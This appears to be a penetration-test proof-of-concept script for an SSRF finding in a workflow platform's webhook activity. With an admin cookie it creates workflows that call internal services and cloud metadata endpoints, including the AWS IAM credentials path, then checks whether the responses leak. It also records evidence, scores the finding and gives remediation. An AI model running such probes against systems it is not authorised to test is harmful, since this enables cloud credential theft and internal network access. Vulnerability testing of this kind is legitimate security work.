#!/usr/bin/env bash
# F01 — SSRF via CALL_WEBHOOK Workflow Activity
#
# Finding: CALL_WEBHOOK activity makes unvalidated fetch() to any URL.
# In multi-tenant SaaS: tenant admin can reach AWS IMDS, internal services.
# CALL_API in same file has SSRF prevention; CALL_WEBHOOK does not.
#
# Requires: Admin role (workflows.definitions.create + workflows.instances.create)
# Impact: Internal network access, cloud metadata credential exfiltration
#
# Expected (secure): 400 error "URL targets a private or reserved address"
# Expected (insecure): Workflow executes and returns response from internal URL
#
# CVSS v3 (SaaS): AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N (8.7 Critical)
# CVSS v3 (self-hosted): AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N (6.0 Medium)

set -uo pipefail

TARGET="${TARGET:-10.0.63.14}"
APP_PORT="${APP_PORT:-3000}"
BASE_URL="${BASE_URL:-http://$TARGET:$APP_PORT}"
ADMIN_COOKIE="${ADMIN_COOKIE:-}"
EVIDENCE_FILE="${EVIDENCE_FILE:-$(dirname "$0")/../evidence/F01-ssrf-call-webhook.txt}"

# Internal targets to probe — ordered by impact
SSRF_TARGETS=(
  "http://127.0.0.1:7700/health"                                          # Meilisearch
  "http://127.0.0.1:6379"                                                  # Redis (won't speak HTTP but confirms reach)
  "http://127.0.0.1:5432"                                                  # Postgres (same)
  "http://169.254.169.254/latest/meta-data/"                               # AWS IMDS
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"      # AWS IAM creds
  "http://metadata.google.internal/computeMetadata/v1/"                    # GCP metadata
)

mkdir -p "$(dirname "$EVIDENCE_FILE")"
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

create_workflow_def() {
  local webhook_url="$1"
  cat <<EOF
{
  "name": "security-test-ssrf-$(date +%s)",
  "description": "Security test workflow",
  "steps": [
    {
      "stepId": "start",
      "stepType": "START",
      "transitions": [{"targetStepId": "webhook_step", "condition": null}]
    },
    {
      "stepId": "webhook_step",
      "stepType": "AUTOMATED",
      "activities": [
        {
          "activityId": "act1",
          "activityType": "CALL_WEBHOOK",
          "config": {
            "url": "$webhook_url",
            "method": "GET"
          }
        }
      ],
      "transitions": [{"targetStepId": "end", "condition": null}]
    },
    {
      "stepId": "end",
      "stepType": "END"
    }
  ]
}
EOF
}

{
echo "================================================================"
echo " F01: SSRF via CALL_WEBHOOK"
echo " Target: $BASE_URL"
echo " Timestamp: $TIMESTAMP"
echo "================================================================"
echo ""

if [[ -z "$ADMIN_COOKIE" ]]; then
  echo "[!] ADMIN_COOKIE not set. Run: source poc/auth.sh"
  echo ""
  echo "--- PoC (manual, shows full request chain) ---"
  echo ""
  echo "# Step 1: Create a workflow definition with CALL_WEBHOOK pointing at internal URL"
  echo "WFLOW_DEF=\$(curl -s -X POST $BASE_URL/api/workflows/definitions \\"
  echo "  -H 'Content-Type: application/json' \\"
  echo "  -H 'Cookie: auth_token=<token>' \\"
  echo "  -d '$(create_workflow_def "http://127.0.0.1:7700/health")')"
  echo "WFLOW_ID=\$(echo \$WFLOW_DEF | python3 -c \"import sys,json; print(json.load(sys.stdin)['id'])\")"
  echo ""
  echo "# Step 2: Start an instance"
  echo "INSTANCE=\$(curl -s -X POST $BASE_URL/api/workflows/instances \\"
  echo "  -H 'Content-Type: application/json' \\"
  echo "  -H 'Cookie: auth_token=<token>' \\"
  echo "  -d \"{\\\"workflowDefinitionId\\\": \\\"\$WFLOW_ID\\\", \\\"context\\\": {}}\")"
  echo "INSTANCE_ID=\$(echo \$INSTANCE | python3 -c \"import sys,json; print(json.load(sys.stdin)['id'])\")"
  echo ""
  echo "# Step 3: Poll for result — check if internal service response appears"
  echo "sleep 3"
  echo "curl -s $BASE_URL/api/workflows/instances/\$INSTANCE_ID \\"
  echo "  -H 'Cookie: auth_token=<token>' | python3 -m json.tool"
  echo ""
  echo "# If VULNERABLE: you'll see Meilisearch health response in workflow context"
  echo "# If PATCHED: you'll see error 'URL targets a private or reserved address'"
  echo "================================================================"
  exit 0
fi

SSRF_CONFIRMED=false

for SSRF_URL in "${SSRF_TARGETS[@]}"; do
  echo "--- Probing: $SSRF_URL ---"
  WDEF_PAYLOAD=$(create_workflow_def "$SSRF_URL")

  # Create workflow definition
  WDEF_RESP=$(curl -s --max-time 15 -X POST "$BASE_URL/api/workflows/definitions" \
    -H "Content-Type: application/json" \
    -H "Cookie: $ADMIN_COOKIE" \
    -d "$WDEF_PAYLOAD" 2>/dev/null)
  WDEF_ID=$(echo "$WDEF_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('id',''))" 2>/dev/null)

  if [[ -z "$WDEF_ID" ]]; then
    echo "  Could not create workflow definition: $WDEF_RESP"
    continue
  fi
  echo "  Workflow definition created: $WDEF_ID"

  # Start instance
  INST_RESP=$(curl -s --max-time 15 -X POST "$BASE_URL/api/workflows/instances" \
    -H "Content-Type: application/json" \
    -H "Cookie: $ADMIN_COOKIE" \
    -d "{\"workflowDefinitionId\": \"$WDEF_ID\", \"context\": {}}" 2>/dev/null)
  INST_ID=$(echo "$INST_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('id',''))" 2>/dev/null)

  if [[ -z "$INST_ID" ]]; then
    echo "  Could not start instance: $INST_RESP"
    continue
  fi
  echo "  Instance started: $INST_ID"

  # Wait and poll
  sleep 4
  RESULT=$(curl -s --max-time 10 "$BASE_URL/api/workflows/instances/$INST_ID" \
    -H "Cookie: $ADMIN_COOKIE" 2>/dev/null)

  echo "  Instance result:"
  echo "$RESULT" | python3 -m json.tool 2>/dev/null | head -40

  # Check if internal response leaked into context
  if echo "$RESULT" | grep -qi "available\|meilisearch\|redis\|postgres\|ami-id\|security-credentials\|iam"; then
    echo ""
    echo "  RESULT: *** SSRF CONFIRMED *** — Internal service response visible in workflow context"
    SSRF_CONFIRMED=true
  elif echo "$RESULT" | grep -qi "private.*reserved\|SSRF\|blocked\|validateWebhook"; then
    echo ""
    echo "  RESULT: PATCHED — URL validation blocked the request"
  else
    echo ""
    echo "  RESULT: INCONCLUSIVE — Check workflow context manually in admin UI"
  fi
  echo ""
done

echo "--- Summary ---"
if $SSRF_CONFIRMED; then
  echo "RESULT: VULNERABLE — SSRF confirmed via CALL_WEBHOOK"
  echo "IMPACT: Internal network accessible from workflow execution context"
else
  echo "RESULT: INCONCLUSIVE or PATCHED — No SSRF confirmed in this run"
  echo "        Verify workflow execution results manually in admin UI"
fi
echo ""
echo "Remediation: Add validateWebhookUrl() to executeCallWebhook() in activity-executor.ts"
echo "  See SPEC-061 H2 for implementation details"
echo "================================================================"
} | tee "$EVIDENCE_FILE"

echo "[+] Evidence saved to: $EVIDENCE_FILE"
